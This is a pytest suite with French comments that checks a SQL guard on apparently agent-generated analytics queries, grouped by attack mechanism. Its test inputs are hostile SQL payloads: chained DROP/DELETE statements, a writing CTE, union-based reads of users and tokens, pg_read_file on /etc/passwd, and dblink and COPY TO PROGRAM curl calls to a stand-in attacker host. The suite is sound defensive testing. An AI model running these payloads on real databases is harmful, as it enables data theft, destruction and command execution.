"""Batterie d'attaques contre la garde SQL (S6-J1).

Le livrable du jour, tel que le rapport le formule, est « **SQL malveillant systématiquement
bloqué (tests)** ». Ce fichier *est* le livrable : la garde ne vaut que ce que valent les attaques
qu'on lui oppose.

Les cas sont regroupés par **mécanisme d'attaque** et non par mot-clé, parce que c'est ainsi qu'ils
se conçoivent : enchaîner un ordre, écrire depuis une CTE, atteindre une table par une sous-requête,
sortir du moteur par une fonction. Un test par mot-clé donnerait l'illusion de la couverture.

Tout tourne sans base de données : la garde est purement syntaxique. La seconde barrière — le rôle
PostgreSQL `insight_ro` de la migration V11 — est testée côté backend, avec Testcontainers.
"""
import pytest

from app.agents.sql_guard import MAX_ROWS, SqlRejected, validate

OK = "SELECT category, COUNT(*) AS n FROM v_tickets GROUP BY category"


def reason(sql: str) -> str:
    """Valide et renvoie le motif de refus. Échoue si la requête passe."""
    with pytest.raises(SqlRejected) as excinfo:
        validate(sql)
    return excinfo.value.reason


# ---------------------------------------------------------------------------
# Requêtes légitimes — une garde qui refuse tout est inutile
# ---------------------------------------------------------------------------


def test_accepts_a_simple_aggregate():
    assert "v_tickets" in validate(OK)


def test_accepts_a_join_between_two_allowed_views():
    sql = """
        SELECT d.day, d.tickets, s.total_tickets
        FROM v_daily_volume d CROSS JOIN v_ticket_stats s
        WHERE d.category = 'FACTURATION'
    """
    assert "v_daily_volume" in validate(sql)


def test_accepts_a_cte_over_an_allowed_view():
    # Une CTE est un nom local : la refuser parce qu'elle n'est pas dans la liste blanche serait
    # une erreur de conception fréquente dans ce genre de garde.
    sql = """
        WITH recent AS (SELECT * FROM v_tickets WHERE age_hours < 168)
        SELECT priority, COUNT(*) FROM recent GROUP BY priority
    """
    assert "recent" in validate(sql)

def test_accepts_a_union_of_allowed_views():
    sql = "SELECT day, tickets FROM v_daily_volume UNION ALL SELECT day, tickets FROM v_category_trends"
    assert validate(sql)


def test_accepts_a_window_function():
    sql = ("SELECT day, tickets, SUM(tickets) OVER (ORDER BY day) AS cumul "
           "FROM v_daily_volume")
    assert validate(sql)


# ---------------------------------------------------------------------------
# Mécanisme 1 — enchaîner un second ordre
# ---------------------------------------------------------------------------


def test_rejects_a_chained_statement():
    assert reason(f"{OK}; DROP TABLE users") == "multiple_statements"


def test_rejects_a_chained_statement_hidden_by_a_comment():
    # La forme classique : le commentaire neutralise ce que le développeur avait prévu d'ajouter.
    assert reason(f"{OK}; DELETE FROM tickets -- ") == "multiple_statements"


def test_rejects_a_trailing_statement_after_a_newline():
    assert reason(f"{OK};\nUPDATE users SET role = 'ADMIN'") == "multiple_statements"


# ---------------------------------------------------------------------------
# Mécanisme 2 — écrire
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "DELETE FROM tickets",
        "UPDATE users SET role = 'ADMIN' WHERE id = 1",
        "INSERT INTO users (email) VALUES ('x@y.z')",
        "DROP VIEW v_tickets",
        "TRUNCATE TABLE tickets",
        "CREATE TABLE evil (id INT)",
        "ALTER TABLE users ADD COLUMN backdoor TEXT",
        "GRANT ALL ON users TO insight_ro",
    ],
)
def test_rejects_every_write_statement(sql):
    # Le motif importe peu (not_a_select ou write_or_command selon la forme) : ce qui compte est
    # qu'aucune de ces requêtes ne ressorte de la garde.
    assert reason(sql) in {"not_a_select", "write_or_command", "unparseable"}


def test_rejects_a_writing_cte():
    """La forme la plus intéressante du lot.

    PostgreSQL autorise l'écriture depuis une CTE. La racine de l'arbre est alors un SELECT
    parfaitement légitime — une garde qui ne regarde que le type de la racine laisse passer.
    """
    sql = """
        WITH victime AS (DELETE FROM tickets WHERE id > 0 RETURNING id)
        SELECT COUNT(*) FROM victime
    """
    assert reason(sql) == "write_or_command"


def test_rejects_select_into():
    # Une écriture déguisée en lecture : la syntaxe commence par SELECT.
    assert reason("SELECT * INTO copie FROM v_tickets") == "write_or_command"


# ---------------------------------------------------------------------------
# Mécanisme 3 — atteindre une relation non autorisée
# ---------------------------------------------------------------------------


def test_rejects_reading_the_users_table():
    assert reason("SELECT email, password_hash FROM users") == "relation_not_allowed"


def test_rejects_reading_a_raw_table_even_if_a_view_exists_over_it():
    # `tickets` contient le corps du message et l'adresse du client ; `v_tickets` non. Toute la
    # minimisation des données repose sur cette distinction.
    assert reason("SELECT customer_email, body FROM tickets") == "relation_not_allowed"


def test_rejects_a_forbidden_table_reached_by_subquery():
    sql = ("SELECT * FROM v_tickets WHERE ticket_id IN "
           "(SELECT id FROM refresh_tokens)")
    assert reason(sql) == "relation_not_allowed"


def test_rejects_a_forbidden_table_reached_by_union():
    # Exfiltration classique : la première branche est irréprochable.
    sql = "SELECT subject FROM v_tickets UNION ALL SELECT email FROM users"
    assert reason(sql) == "relation_not_allowed"


def test_rejects_a_forbidden_table_reached_by_join():
    sql = "SELECT u.email FROM v_tickets t JOIN users u ON u.id = t.ticket_id"
    assert reason(sql) == "relation_not_allowed"


def test_rejects_a_forbidden_table_reached_by_cte():
    sql = ("WITH fuite AS (SELECT email FROM users) "
           "SELECT * FROM fuite")
    assert reason(sql) == "relation_not_allowed"


def test_rejects_the_catalog():
    assert reason("SELECT tablename FROM pg_catalog.pg_tables") == "system_schema"


def test_rejects_information_schema():
    # Première étape de toute reconnaissance : cartographier le schéma.
    assert reason("SELECT table_name FROM information_schema.tables") == "system_schema"


def test_rejects_a_schema_qualified_allowed_view_name_used_as_a_disguise():
    # `public.users` porte un nom de table interdite malgré la qualification.
    assert reason("SELECT * FROM public.users") == "relation_not_allowed"


def test_rejects_a_query_without_any_relation():
    # `SELECT 1` ou `SELECT version()` : sondage, jamais une question de manager.
    assert reason("SELECT 1") == "no_relation"


# ---------------------------------------------------------------------------
# Mécanisme 4 — sortir du moteur, ou l'immobiliser
# ---------------------------------------------------------------------------


def test_rejects_a_sleep_used_for_denial_of_service():
    assert reason("SELECT pg_sleep(60) FROM v_tickets") == "forbidden_function"


def test_rejects_a_sleep_whatever_the_case():
    # PostgreSQL est insensible à la casse sur les identifiants non quotés ; la garde doit l'être.
    assert reason("SELECT PG_SLEEP(60) FROM v_tickets") == "forbidden_function"


def test_rejects_reading_a_server_file():
    sql = "SELECT pg_read_file('/etc/passwd') FROM v_tickets"
    assert reason(sql) == "forbidden_function"


def test_rejects_exfiltration_by_dblink():
    sql = "SELECT dblink('host=attaquant.example', 'SELECT 1') FROM v_tickets"
    assert reason(sql) == "forbidden_function"


def test_rejects_changing_a_session_setting():
    # `set_config('transaction_read_only', 'off', false)` viserait la seconde barrière.
    sql = "SELECT set_config('transaction_read_only', 'off', false) FROM v_tickets"
    assert reason(sql) == "forbidden_function"


def test_rejects_a_set_command():
    assert reason("SET statement_timeout = 0") in {"not_a_select", "write_or_command", "unparseable"}


def test_rejects_copy_to_program():
    # Exécution de commande système par COPY : la faille PostgreSQL la plus citée.
    sql = "COPY (SELECT * FROM v_tickets) TO PROGRAM 'curl attaquant.example'"
    assert reason(sql) in {"not_a_select", "write_or_command", "unparseable"}


# ---------------------------------------------------------------------------
# Robustesse de l'analyse
# ---------------------------------------------------------------------------


def test_rejects_unparseable_input():
    assert reason("ceci n'est pas du SQL") in {"unparseable", "not_a_select", "no_relation"}


def test_rejects_empty_input():
    assert reason("   ") == "empty_sql"


def test_a_forbidden_keyword_inside_a_string_literal_is_harmless():
    """Le miroir du test précédent : une garde par mots-clés refuserait cette requête légitime.

    Un filtre sur la chaîne « DELETE » bloquerait une question parfaitement valide portant sur un
    sujet contenant ce mot. C'est le second défaut des listes de mots interdits, après leur
    perméabilité : elles produisent des faux positifs qu'on ne comprend pas.
    """
    sql = "SELECT * FROM v_tickets WHERE subject ILIKE '%suppression de compte%'"
    assert validate(sql)


# ---------------------------------------------------------------------------
# Plafond de lignes
# ---------------------------------------------------------------------------


def test_adds_a_limit_when_missing():
    assert f"LIMIT {MAX_ROWS}" in validate(OK).upper()


def test_keeps_a_smaller_limit():
    out = validate("SELECT * FROM v_tickets LIMIT 10").upper()
    assert "LIMIT 10" in out


def test_caps_an_excessive_limit():
    out = validate("SELECT * FROM v_tickets LIMIT 100000").upper()
    assert f"LIMIT {MAX_ROWS}" in out
    assert "100000" not in out


def test_replaces_a_non_literal_limit():
    out = validate("SELECT * FROM v_tickets LIMIT (SELECT 9999)").upper()
    assert f"LIMIT {MAX_ROWS}" in out


# ---------------------------------------------------------------------------
# La sortie est régénérée depuis l'arbre
# ---------------------------------------------------------------------------


def test_output_is_rendered_from_the_parsed_tree():
    """Ce qui est exécuté doit être exactement ce qui a été analysé.

    Renvoyer la chaîne d'origine après contrôle est la faille classique des validateurs : une
    astuce d'encodage suffit alors à faire diverger le texte validé du texte exécuté. Ici le
    commentaire disparaît, ce qui prouve que la sortie est reconstruite et non recopiée.
    """
    out = validate(f"{OK} /* commentaire */")
    assert "commentaire" not in out
    assert "v_tickets" in out


def test_a_line_comment_cannot_neutralise_the_injected_limit():
    """Régression trouvée en écrivant ces tests.

    Le plafond de lignes est ajouté **après** la requête. Si un commentaire de fin de ligne
    survivait au rendu, tout ce qui suit serait ignoré par PostgreSQL — `LIMIT` compris — et le
    plafond sauterait en silence. Le cas le plus dangereux est celui qui ne lève aucune erreur.
    """
    out = validate("SELECT category FROM v_tickets -- fin de ligne")
    assert "--" not in out
    assert out.upper().rstrip().endswith(f"LIMIT {MAX_ROWS}")
